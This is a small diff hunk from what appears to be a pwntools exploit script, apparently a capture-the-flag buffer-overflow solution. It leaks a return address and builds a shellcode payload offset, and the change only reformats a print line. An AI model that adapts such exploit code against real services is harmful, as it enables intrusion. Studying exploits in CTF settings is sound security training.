@@ -58,7 +58,7 @@ shellcode_len = len(shellcode)
 # get return address
 io.recvuntil("I'm waiting for you at ")
 leak = int(io.recvuntil("\n",drop=True),16)
-print("[!]Retturn Address"+hex(leak))
+print("[!]Retturn Address = "+hex(leak))
 
 # craft payload
 offset = 88 - shellcode_len
